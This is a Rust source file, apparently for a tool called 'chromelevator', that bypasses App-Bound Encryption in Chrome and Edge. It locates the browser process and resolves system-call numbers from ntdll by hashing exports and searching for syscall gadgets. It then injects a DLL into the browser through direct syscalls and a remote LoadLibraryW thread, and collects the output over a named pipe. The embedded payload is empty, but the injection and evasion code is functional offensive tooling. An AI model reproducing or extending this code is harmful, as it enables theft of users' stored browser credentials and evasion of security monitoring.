use std::path::{PathBuf};
use std::ptr;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
use windows_sys::Win32::System::Pipes::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};
use serde::{Deserialize, Serialize};

// --- Config ---

pub struct BrowserConfig {
    pub name: &'static str,
    pub process_name: &'static str,
    pub clsid: windows_sys::core::GUID,
    pub iid: windows_sys::core::GUID,
    pub iid_v2: Option<windows_sys::core::GUID>,
    pub user_data_path: PathBuf,
}

const fn guid(data1: u32, data2: u16, data3: u16, data4: [u8; 8]) -> windows_sys::core::GUID {
    windows_sys::core::GUID { data1, data2, data3, data4 }
}

pub fn get_configs() -> Vec<BrowserConfig> {
    let local_app = get_local_app_data();
    vec![
        BrowserConfig {
            name: "chrome",
            process_name: "chrome.exe",
            clsid: guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]),
            iid: guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]),
            iid_v2: Some(guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38])),
            user_data_path: local_app.join("Google").join("Chrome").join("User Data"),
        },
        BrowserConfig {
            name: "edge",
            process_name: "msedge.exe",
            clsid: guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]),
            iid: guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]),
            iid_v2: Some(guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05])),
            user_data_path: local_app.join("Microsoft").join("Edge").join("User Data"),
        },
    ]
}

fn get_local_app_data() -> PathBuf {
    use windows_sys::Win32::UI::Shell::*;
    let mut path_ptr = std::ptr::null_mut();
    unsafe {
        if SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, 0, &mut path_ptr) == S_OK {
            let mut len = 0;
            while *path_ptr.offset(len) != 0 { len += 1; }
            let path_str = std::slice::from_raw_parts(path_ptr, len as usize);
            let path = PathBuf::from(String::from_utf16_lossy(path_str));
            windows_sys::Win32::System::Com::CoTaskMemFree(path_ptr as *mut _);
            return path;
        }
    }
    PathBuf::new()
}

// --- Syscalls ---

#[derive(Debug, Clone, Copy)]
pub struct SyscallEntry {
    pub ssn: u32,
    pub gadget: *const u8,
}

pub struct SyscallStubs {
    pub nt_allocate_virtual_memory: SyscallEntry,
    pub nt_write_virtual_memory: SyscallEntry,
    pub nt_read_virtual_memory: SyscallEntry,
    pub nt_create_thread_ex: SyscallEntry,
    pub nt_free_virtual_memory: SyscallEntry,
    pub nt_protect_virtual_memory: SyscallEntry,
    pub nt_open_process: SyscallEntry,
    pub nt_close: SyscallEntry,
}

#[cfg(target_arch = "x86_64")]
pub unsafe fn invoke_syscall(entry: SyscallEntry, args: &[usize]) -> NTSTATUS {
    let ssn = entry.ssn;
    let mut status: i32 = 0;

    match args.len() {
        0 => core::arch::asm!("mov r10, rcx", "syscall", in("eax") ssn, lateout("rax") status),
        1 => core::arch::asm!("mov r10, rcx", "syscall", in("eax") ssn, in("rcx") args[0], lateout("rax") status),
        2 => core::arch::asm!("mov r10, rcx", "syscall", in("eax") ssn, in("rcx") args[0], in("rdx") args[1], lateout("rax") status),
        3 => core::arch::asm!("mov r10, rcx", "syscall", in("eax") ssn, in("rcx") args[0], in("rdx") args[1], in("r8") args[2], lateout("rax") status),
        4 => core::arch::asm!("mov r10, rcx", "syscall", in("eax") ssn, in("rcx") args[0], in("rdx") args[1], in("r8") args[2], in("r9") args[3], lateout("rax") status),
        _ => {
            let stack_args = &args[4..];
            for &arg in stack_args.iter().rev() {
                core::arch::asm!("push {arg}", arg = in(reg) arg);
            }
            core::arch::asm!("sub rsp, 0x20");
            core::arch::asm!(
                "mov r10, rcx",
                "syscall",
                in("eax") ssn,
                in("rcx") args[0],
                in("rdx") args[1],
                in("r8") args[2],
                in("r9") args[3],
                lateout("rax") status
            );
            core::arch::asm!("add rsp, {size}", size = in(reg) (0x20 + stack_args.len() * 8));
        }
    }
    status as NTSTATUS
}

pub fn init_syscalls() -> Option<SyscallStubs> {
    unsafe {
        let ntdll = GetModuleHandleW(u16_str("ntdll.dll").as_ptr());
        if ntdll == 0 { return None; }

        let dos_header = ntdll as *const IMAGE_DOS_HEADER;
        let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
        let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
        if export_dir_rva == 0 { return None; }

        let export_dir = (ntdll as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
        let names = (ntdll as usize + (*export_dir).AddressOfNames as usize) as *const u32;
        let functions = (ntdll as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
        let ordinals = (ntdll as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;

        let mut syscalls = Vec::new();
        for i in 0..(*export_dir).NumberOfNames {
            let name_ptr = (ntdll as usize + *names.offset(i as isize) as usize) as *const u8;
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8).to_str().unwrap_or("");
            if name.starts_with("Zw") {
                let func_addr = (ntdll as usize + *functions.offset(*ordinals.offset(i as isize) as isize) as usize) as *const u8;
                syscalls.push((djb2_hash(name), func_addr));
            }
        }
        syscalls.sort_by_key(|&(_, addr)| addr);

        let find = |h: u32| {
            syscalls.iter().enumerate().find(|(_, &(hash, _))| hash == h)
                .map(|(ssn, &(_, addr))| SyscallEntry { ssn: ssn as u32, gadget: find_gadget(addr) })
        };

        Some(SyscallStubs {
            nt_allocate_virtual_memory: find(djb2_hash("ZwAllocateVirtualMemory"))?,
            nt_write_virtual_memory: find(djb2_hash("ZwWriteVirtualMemory"))?,
            nt_read_virtual_memory: find(djb2_hash("ZwReadVirtualMemory"))?,
            nt_create_thread_ex: find(djb2_hash("ZwCreateThreadEx"))?,
            nt_free_virtual_memory: find(djb2_hash("ZwFreeVirtualMemory"))?,
            nt_protect_virtual_memory: find(djb2_hash("ZwProtectVirtualMemory"))?,
            nt_open_process: find(djb2_hash("ZwOpenProcess"))?,
            nt_close: find(djb2_hash("ZwClose"))?,
        })
    }
}

fn djb2_hash(s: &str) -> u32 {
    let mut hash: u32 = 5381;
    for b in s.bytes() { hash = (hash.wrapping_shl(5).wrapping_add(hash)).wrapping_add(b as u32); }
    hash
}

fn find_gadget(func: *const u8) -> *const u8 {
    unsafe {
        for i in 0..64 {
            if *func.offset(i) == 0x0F && *func.offset(i + 1) == 0x05 && *func.offset(i + 2) == 0xC3 {
                return func.offset(i);
            }
        }
    }
    ptr::null()
}

// --- Injector ---

const PROCESS_ALL_ACCESS: u32 = 0x000F0000 | 0x00100000 | 0xFFFF;

#[derive(Serialize, Deserialize)]
struct BrowserPayloadConfig {
    pub verbose: bool,
    pub fingerprint: bool,
    pub output_path: String,
    pub browser_type: String,
}

pub struct Injector {
    pub verbose: bool,
    pub output_path: PathBuf,
}

pub fn run_abe_bypass(target_browser: &str, verbose: bool, output_path: PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let injector = Injector::new(verbose, output_path);
    injector.run_abe_bypass(target_browser)
}

impl Injector {
    pub fn new(verbose: bool, output_path: PathBuf) -> Self {
        Self { verbose, output_path }
    }

    pub fn run_abe_bypass(&self, target_browser: &str) -> Result<(), Box<dyn std::error::Error>> {
        let configs = get_configs();
        let config = configs.iter().find(|c| c.name == target_browser)
            .ok_or_else(|| format!("Browser '{}' not found", target_browser))?;

        let pid = self.find_process(config.process_name)?;
        if pid == 0 { return Err(format!("Process '{}' not found", config.process_name).into()); }

        let stubs = init_syscalls().ok_or("Failed to init syscalls")?;
        let pipe_name = format!("\\\\.\\pipe\\chromelevator_{}", pid);
        let h_pipe = unsafe {
            CreateNamedPipeW(u16_str(&pipe_name).as_ptr(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 1024, 1024, 0, ptr::null())
        };

        let payload_bytes = b"";
        self.inject(pid, payload_bytes, &stubs)?;

        unsafe {
            if ConnectNamedPipe(h_pipe, ptr::null_mut()) == 0 && GetLastError() != ERROR_PIPE_CONNECTED {
                windows_sys::Win32::Foundation::CloseHandle(h_pipe);
                return Err("Pipe connection failed".into());
            }
        }

        let payload_config = BrowserPayloadConfig {
            verbose: self.verbose,
            fingerprint: false,
            output_path: self.output_path.to_string_lossy().to_string(),
            browser_type: target_browser.to_string(),
        };
        let config_json = serde_json::to_vec(&payload_config)?;
        let mut written = 0;
        unsafe { WriteFile(h_pipe, config_json.as_ptr() as *const _, config_json.len() as u32, &mut written, ptr::null_mut()); }

        let mut buf = [0u8; 1024];
        loop {
            let mut bytes_read = 0;
            unsafe {
                if ReadFile(h_pipe, buf.as_mut_ptr() as *mut _, buf.len() as u32, &mut bytes_read, ptr::null_mut()) == 0 || bytes_read == 0 {
                    break;
                }
            }
            let msg = String::from_utf8_lossy(&buf[..bytes_read as usize]);
            print!("{}", msg);
            if msg.contains("DONE") { break; }
        }

        unsafe { windows_sys::Win32::Foundation::CloseHandle(h_pipe); }
        Ok(())
    }

    fn find_process(&self, exe_name: &str) -> Result<u32, Box<dyn std::error::Error>> {
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            if Process32FirstW(snapshot, &mut entry) != 0 {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]);
                    if name.eq_ignore_ascii_case(exe_name) {
                        windows_sys::Win32::Foundation::CloseHandle(snapshot);
                        return Ok(entry.th32ProcessID);
                    }
                    if Process32NextW(snapshot, &mut entry) == 0 { break; }
                }
            }
            windows_sys::Win32::Foundation::CloseHandle(snapshot);
        }
        Ok(0)
    }

    fn inject(&self, pid: u32, payload: &[u8], stubs: &SyscallStubs) -> Result<(), Box<dyn std::error::Error>> {
        unsafe {
            let mut h_proc: HANDLE = 0;
            #[allow(non_snake_case)]
            let mut oa: OBJECT_ATTRIBUTES = std::mem::zeroed();
            oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
            #[allow(non_snake_case)]
            let mut cid = CLIENT_ID { UniqueProcess: pid as _, UniqueThread: 0 };

            syscalls_invoke(stubs.nt_open_process, &[&mut h_proc as *mut _ as usize, PROCESS_ALL_ACCESS as usize, &mut oa as *mut _ as usize, &mut cid as *mut _ as usize]);

            let temp_dll = std::env::temp_dir().join(format!("cl_{}.dll", pid));
            std::fs::write(&temp_dll, payload)?;
            let dll_path_u16 = u16_str(&temp_dll.to_string_lossy());

            let mut remote_dll_path: *mut std::ffi::c_void = ptr::null_mut();
            let mut reg_size = dll_path_u16.len() * 2;
            syscalls_invoke(stubs.nt_allocate_virtual_memory, &[h_proc as usize, &mut remote_dll_path as *mut _ as usize, 0, &mut reg_size as *mut _ as usize, (MEM_COMMIT | MEM_RESERVE) as usize, PAGE_READWRITE as usize]);

            let mut written = 0;
            syscalls_invoke(stubs.nt_write_virtual_memory, &[h_proc as usize, remote_dll_path as usize, dll_path_u16.as_ptr() as usize, dll_path_u16.len() * 2, &mut written as *mut _ as usize]);

            let k32 = GetModuleHandleW(u16_str("kernel32.dll").as_ptr());
            let load_library = GetProcAddress(k32, b"LoadLibraryW\0".as_ptr() as *const _).unwrap();

            let mut h_thread: HANDLE = 0;
            invoke_syscall(stubs.nt_create_thread_ex, &[
                &mut h_thread as *mut _ as usize, THREAD_ALL_ACCESS as usize, 0, h_proc as usize,
                load_library as usize, remote_dll_path as usize, 0, 0, 0, 0, 0
            ]);

            if h_thread != 0 {
                WaitForSingleObject(h_thread, INFINITE);
                invoke_syscall(stubs.nt_close, &[h_thread as usize]);
            }
            invoke_syscall(stubs.nt_close, &[h_proc as usize]);
        }
        Ok(())
    }
}

unsafe fn syscalls_invoke(entry: SyscallEntry, args: &[usize]) -> NTSTATUS {
    invoke_syscall(entry, args)
}

fn u16_str(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[repr(C)]
struct CLIENT_ID { UniqueProcess: HANDLE, UniqueThread: HANDLE }

#[repr(C)]
struct OBJECT_ATTRIBUTES {
    Length: u32,
    RootDirectory: HANDLE,
    ObjectName: *const std::ffi::c_void,
    Attributes: u32,
    SecurityDescriptor: *const std::ffi::c_void,
    SecurityQualityOfService: *const std::ffi::c_void,
}
